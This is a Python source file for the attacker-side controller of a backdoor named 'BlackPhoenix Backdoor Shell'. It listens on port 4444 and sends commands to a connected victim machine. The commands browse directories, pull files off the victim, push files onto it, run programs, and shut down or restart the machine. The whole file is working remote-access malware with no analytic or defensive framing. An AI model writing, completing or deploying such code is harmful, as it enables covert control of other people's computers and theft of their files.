import socket, os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

host,port='192.168.43.82',4444

s.bind((host,port))

print("listening...")
s.listen(1)
while 1:

    conn,addr=s.accept()
    print("connection received")

    while 1:
        command=input("BlackPhoenix Backdoor Shell:")
        command=command.lower()

        if command=="pwd" or command=="gcwd":
            conn.send(command.encode())
            pwd=conn.recv(1024)
            print(pwd.decode())

        elif command=="ls" or command=="dir":
            conn.send(command.encode())
            files=conn.recv(2056)
            print(files.decode())

        elif command.split(":")[0]=="cd":
            conn.send(command.encode())
            tdir=command.split(":")[1]
            conn.send(tdir.encode())

        elif command.split(":")[0]=="tdownload":
            conn.send(command.encode())
            tfpath=command.split(":")[1]
            conn.send(tfpath.encode())
            fsize=int(conn.recv(1024).decode())
            fdata=conn.recv(fsize*1000+10).decode()           
            nfile=open(tfpath,'w').write(fdata)

        elif command.split(":")[0]=="bdownload":
            conn.send(command.encode())
            tfpath=command.split(":")[1]
            conn.send(tfpath.encode())
            fsize=int(conn.recv(1024).decode())
            fdata=conn.recv(fsize*1000+10)         
            nfile=open(tfpath,'wb').write(fdata)

        elif command.split(":")[0]=="tupload":
            conn.send(command.encode())
            fpath=command.split(":")[1]
            conn.send(fpath.encode())
            fdata2=open(fpath,'r').read()
            fsize2=len(fdata2)
            conn.send(str(fsize2).encode())
            conn.send(fdata2.encode())

        elif command.split(":")[0]=="bupload":
            conn.send(command.encode())
            fpath=command.split(":")[1]
            conn.send(fpath.encode())
            fdata2=open(fpath,'rb').read()
            fsize2=len(fdata2)
            conn.send(str(fsize2).encode())
            conn.send(fdata2)
            

        elif command.split(":")[0]=="run" or command.split(":")[0]=="exec":
            conn.send(command.encode())
            prog=command.split(":")[1]
            conn.send(prog.encode())

        elif command.split(":")[0]=="type":
            conn.send(command.encode())

        elif command=="shutdown":
            conn.send(command.encode())

        elif command=="restart":
            conn.send(command.encode())
            


        elif command=="exit" or command=="quit" or command=="q":
            s.close()
            exit()

        

            
            

        else:
            os.system(command)        

      
           

            
